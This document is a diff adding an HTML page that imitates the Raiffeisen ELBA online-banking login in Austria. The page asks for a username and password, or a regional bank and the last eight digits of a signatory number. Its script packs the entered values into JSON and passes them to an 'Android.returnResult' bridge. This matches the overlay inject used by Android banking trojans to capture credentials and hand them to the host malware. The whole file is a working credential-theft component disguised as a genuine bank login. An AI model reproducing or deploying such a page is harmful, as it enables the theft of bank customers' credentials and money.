@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>meine</title>
+    <link rel="shortcut icon" href="com.isis_papyrus.raiffeisen_pay_eyewdg.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 0px 0px 0px 0px;
+    background: #fff;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #515151;
+    text-align: left;
+    outline: none;
+    border: none;
+    background: #fafafa;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #555;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #FFEB3B;
+}
+input::placeholder {
+    color: #515151;;
+    font-size: 15px;
+}
+</style>
+
+<script type="text/javascript">
+    function signatory() {
+        document.getElementById("username").style.display="none";
+        document.getElementById("signatory").style.display="block";
+    }
+    function username() {
+        document.getElementById("signatory").style.display="none";
+        document.getElementById("username").style.display="block";
+    }
+</script>
+
+<fieldset id="formtosend1">
+
+<div class="" id="username" style="display: none;">
+
+<div class="logo">
+<img src="data:image/gif;base64,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" style="width: 130px;">
+<span style="display: block;text-align: center;color: #515151; font-size: 20px;">ELBA-LOGIN</span>
+</div>
+
+<div class="area" style="background: none; padding: 30px; border-radius: 3px;">
+        <input type="button" name="sumbit" onclick="username()" value="User Name" style="width: 50%; border-radius: 0; background: #fff;"> <input type="button" name="sumbit" onclick="signatory()" value="Signatory number" style="width: 50%; border-radius: 0; background: #f1f1f1;">
+        <input type="text" name="login" id="login" placeholder="Benutzer" style="height: 50px; font-size: 15px;">
+        <input type="password" name="password" id="password" placeholder="Passwort" style="height: 50px; font-size: 15px;">
+
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form1()" value="LOG IN">
+</div>
+
+</div>
+
+</fieldset>
+
+<fieldset id="formtosend">
+
+<div class="" id="signatory" style="display: block;">
+
+<div class="logo">
+<img src="data:image/gif;base64,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" style="width: 130px;">
+<span style="display: block;text-align: center;color: #515151; font-size: 20px;">ELBA-LOGIN</span>
+</div>
+
+<div class="area" style="background: none; padding: 30px; border-radius: 3px;">
+        <input type="button" name="sumbit" onclick="username()" value="User Name" style="width: 50%; border-radius: 0; background: #f1f1f1;"> <input type="button" name="sumbit" onclick="signatory()" value="Signatory number" style="width: 50%; border-radius: 0; background: #fff;">
+        <select name="state" style="width: 100%; height: 50px; border: none; background: #fafafa; font-size: 15px; color: #515151; padding: 10px; outline: none;">
+            <option selected="">Select state</option>
+            <option value="Burgenland">Burgenland</option>
+            <option value="Carinthia">Carinthia</option>
+            <option value="Lower Austria/Vienna">Lower Austria/Vienna</option>
+            <option value="Upper Austria">Upper Austria</option>
+            <option value="Salzburg">Salzburg</option>
+            <option value="Styria">Styria</option>
+            <option value="Tyrol">Tyrol</option>
+            <option value="Vorarlberg/Walser Privatbank AG">Vorarlberg/Walser Privatbank AG</option>
+            <option value="Carinthia/Posojilnica Bank">Carinthia/Posojilnica Bank</option>
+            <option value="Upper Austria/bankdirekt.at">Upper Austria/bankdirekt.at</option>
+            <option value="Upper Austria/PRIVAT BANK">Upper Austria/PRIVAT BANK</option>
+            <option value="Tyrol/Jungholz">Tyrol/Jungholz</option>
+        </select>
+        <input type="password" name="signatory_password" id="signatory_password" placeholder="Signatory number (the last 8 digits)" style="height: 50px; font-size: 15px;">
+
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form()" value="LOG IN">
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+if (document.getElementById("signatory_password").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+function send_form1()
+{
+if (document.getElementById("login").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+if (document.getElementById("password").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+    var form = document.getElementById('formtosend1');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
